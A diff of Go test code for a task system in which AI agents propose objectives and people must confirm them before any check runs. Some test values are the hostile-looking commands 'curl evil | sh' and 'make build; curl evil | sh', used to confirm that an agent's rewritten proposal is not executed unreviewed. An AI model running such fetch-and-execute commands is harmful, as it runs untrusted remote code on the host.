@@ -12,7 +12,7 @@ import (
 func TestParseObjectiveTarget(t *testing.T) {
 	for _, c := range []struct {
 		until, measure, better string
-		want                   string // measure until op better unit, "" for an error
+		want                   string
 		target, factor         float64
 	}{
 		{"", "", "", " |||", 0, 0},
@@ -38,7 +38,6 @@ func TestParseObjectiveTarget(t *testing.T) {
 		{"faster", "", "", "", 0, 0},
 		{"2x", "time", "higher", "", 0, 0},
 		{"pass", "time", "", "", 0, 0},
-		// What the parser takes beside those.
 		{"PASSES", "", "", "pass|pass", 0, 0},
 		{" Pass ", "pass", "", "pass|pass", 0, 0},
 		{"<  1.5ms", "", "", "time|< 1.5ms|<|lower", 0.0015, 0},
@@ -110,7 +109,7 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 	if !strings.HasPrefix(ob.Text, "Proposed objective") || ob.Health != "proposed" || ob.Repo != "me/app" {
 		t.Errorf("text %q health %q repo %q", ob.Text, ob.Health, ob.Repo)
 	}
-	o.noJob() // nothing is read, nothing runs
+	o.noJob()
 	if next, _ := o.queued(task.Key); !next {
 		t.Error("a proposal holds the task back from the agents")
 	}
@@ -127,11 +126,9 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 	if _, err := o.s.ObjectiveGo(o.ctx, o.admin, task.Key, ObjectiveRetry); !IsInvalid(err) {
 		t.Errorf("steering a proposal: %v", err)
 	}
-	// The agent can still change or withdraw its own proposal.
 	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Until: ptrOf("-20%")}); err != nil || ob.Until != "-20%" || ob.Check != "make build" || ob.State != ObjectiveProposed {
 		t.Fatalf("changing a proposal: %+v, %v", ob, err)
 	}
-	// A person confirms the proposal they read, not one written over it.
 	read := ob.Rev
 	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Check: ptrOf("make build; curl evil | sh")}); err != nil || ob.Rev == read {
 		t.Fatalf("rewriting a proposal: %+v, %v", ob, err)
@@ -148,8 +145,6 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Check: ptrOf("make build")}); err != nil || ob.Rev != read {
 		t.Fatalf("the proposal put back: %+v, %v", ob, err)
 	}
-	// The rev covers what the new fields say too: a keep-passing command written over a
-	// proposal is another proposal.
 	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{KeepPassing: &[]string{"curl evil | sh"}}); err != nil || ob.Rev == read {
 		t.Fatalf("a keep-passing command written over a proposal: %+v, %v", ob, err)
 	}
@@ -160,8 +155,6 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 		t.Fatalf("the keep-passing command taken out: %+v, %v", ob, err)
 	}
 
-	// A person's change without the rev starts from nothing: no word of the
-	// agent's is carried into what they put in effect.
 	if _, err := o.s.SetObjective(o.ctx, o.admin, task.Key, ObjectiveInput{Pace: ptrOf(PaceSpare)}); !IsInvalid(err) {
 		t.Errorf("a person changing pace with no rev: %v", err)
 	}
@@ -172,7 +165,6 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 		t.Fatalf("a refused change left the proposal %+v", ob)
 	}
 
-	// With the rev they read, their change builds on it.
 	ob = o.set(task.Key, ObjectiveInput{Until: ptrOf("-30%"), Rev: read, KeepPassing: &[]string{"go vet ./..."}})
 	if ob.State != ObjectiveActive || ob.Check != "make build" || ob.Until != "-30%" || ob.ConfirmedBy == nil || len(ob.KeepPassing) != 1 || ob.Phase != PhaseBaseline || ob.Health != "reading" {
 		t.Fatalf("a person's change of the proposal: %+v", ob)
@@ -193,8 +185,6 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 		t.Fatalf("cleared: %+v", d.Objective)
 	}
 
-	// A person's own check, written without the rev, runs and the agent's
-	// doesn't: the agent's judge words are not inherited either.
 	two := o.task("Export")
 	if _, err := o.s.SetObjective(o.ctx, o.ag, two.Key, ObjectiveInput{Check: ptrOf("make export"), Until: ptrOf("pass"), Judge: ptrOf("exports")}); err != nil {
 		t.Fatal(err)
@@ -207,8 +197,6 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 		t.Fatalf("the agent's check ran: %+v", j)
 	}
 
-	// Confirming it as it is puts an agent's proposal in effect on the
-	// confirming person's runner.
 	three := o.task("Lint")
 	p, err := o.s.SetObjective(o.ctx, o.ag, three.Key, ObjectiveInput{Check: ptrOf("make lint"), Until: ptrOf("pass")})
 	if err != nil {
@@ -221,7 +209,6 @@ func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
 		t.Errorf("history = %q", h)
 	}
 
-	// A proposal nobody confirmed leaves the task an ordinary one.
 	other := o.task("Other")
 	if _, err := o.s.SetObjective(o.ctx, o.ag, other.Key, ObjectiveInput{}); err != nil {
 		t.Fatal(err)
@@ -338,21 +325,16 @@ func TestObjectiveInputIsChecked(t *testing.T) {
 	if ob.Dir != "internal" || ob.Every != 3*24*3600 || ob.Setup != "go build ./..." || len(ob.KeepPassing) != 2 || ob.KeepPassing[0] != "go vet ./..." || ob.Branch != "release/1.x" || ob.Repo != "me/app" {
 		t.Fatalf("objective = %+v", ob)
 	}
-	// Changing one field keeps the rest.
 	if ob = o.set(task.Key, ObjectiveInput{Pace: ptrOf("spare")}); ob.Until != "< 90s" || ob.Check != "go test ./..." || ob.Pace != PaceSpare || ob.Every != 3*24*3600 || len(ob.KeepPassing) != 2 || ob.Branch != "release/1.x" {
 		t.Fatalf("after a change: %+v", ob)
 	}
-	// A judge on top of the check, with a bar and models (named by the
-	// audit's own way of naming them, repeats dropped).
 	ob = o.set(task.Key, ObjectiveInput{Judge: ptrOf("It reads well."), JudgeBar: ptrOf(" HIGH "), JudgeModels: &[]string{"claude/opus", " ", "claude/opus", "grok-4.7-high"}})
 	if ob.Judge != "It reads well." || ob.JudgeBar != "high" || len(ob.JudgeModels) != 2 || ob.Kind != "until" || ob.Check != "go test ./..." {
 		t.Fatalf("with a judge: %+v", ob)
 	}
-	// Keep-passing commands are replaced, and emptied.
 	if ob = o.set(task.Key, ObjectiveInput{KeepPassing: &[]string{}}); len(ob.KeepPassing) != 0 || ob.Judge == "" {
 		t.Fatalf("keep-passing commands emptied: %+v", ob)
 	}
-	// Taking the judge off takes its bar and models with it.
 	if ob = o.set(task.Key, ObjectiveInput{Judge: ptrOf("")}); ob.Judge != "" || ob.JudgeBar != "" || len(ob.JudgeModels) != 0 {
 		t.Fatalf("without a judge: %+v", ob)
 	}
@@ -360,13 +342,10 @@ func TestObjectiveInputIsChecked(t *testing.T) {
 	if err != nil || len(list) != 1 || list[0].Key != task.Key {
 		t.Fatalf("list = %+v, %v", list, err)
 	}
-	// A judge alone: the bar defaults to medium, the repository to the
-	// project's only one.
 	j := o.task("Judged")
 	if ob = o.set(j.Key, ObjectiveInput{Judge: ptrOf("done")}); ob.JudgeBar != "medium" || ob.Repo != "me/app" || ob.Kind != "judged" || ob.Measure != "" {
 		t.Fatalf("a judge alone: %+v", ob)
 	}
-	// A closed task takes no objective.
 	done := o.task("Closed")
 	if _, err := o.s.UpdateIssue(o.ctx, o.admin, done.Key, IssuePatch{Status: ptrOf("Done")}); err != nil {
 		t.Fatal(err)
@@ -391,7 +370,6 @@ func TestObjectiveKeepsItsTargetWhenAChangeLeavesItAlone(t *testing.T) {
 	if ob = o.set(other.Key, ObjectiveInput{Until: &ob.Until, MaxRounds: ptrOf(5)}); ob.Measure != MeasureValue || ob.Better != "lower" {
 		t.Errorf("after a change of rounds: measure %s, better %s", ob.Measure, ob.Better)
 	}
-	// A change of the judge, the keep-passing commands or the repository leaves the target.
 	if ob = o.set(other.Key, ObjectiveInput{KeepPassing: &[]string{"make test"}}); ob.Measure != MeasureValue || ob.Better != "lower" || ob.Factor == nil {
 		t.Errorf("after a keep-passing command: %+v", ob)
 	}
@@ -400,7 +378,6 @@ func TestObjectiveKeepsItsTargetWhenAChangeLeavesItAlone(t *testing.T) {
 	if ob = o.set(tidy.Key, ObjectiveInput{Judge: ptrOf("reads well")}); ob.Target == nil || math.Abs(*ob.Target-0.0015) > 1e-12 || ob.Judge != "reads well" {
 		t.Errorf("after a judge: target %v, %+v", ob.Target, ob)
 	}
-	// A fixed target turned into one that never ends gets the day between rounds.
 	if ob = o.set(task.Key, ObjectiveInput{Until: ptrOf("2x")}); ob.Every != 86400 {
 		t.Errorf("every = %v after turning endless", ob.Every)
 	}
@@ -476,7 +453,6 @@ func TestListObjectivesOrdersAndFilters(t *testing.T) {
 	blocked := o.task("Blocked")
 	o.set(blocked.Key, ObjectiveInput{Judge: ptrOf("done")})
 	o.s.Wait()
-	// Its repository goes: nothing can read it, a person is asked.
 	if _, err := o.s.db.W.ExecContext(o.ctx, `DELETE FROM project_repos WHERE project_id = ?`, o.p.ID); err != nil {
 		t.Skip("can't detach the repository here: ", err)
 	}
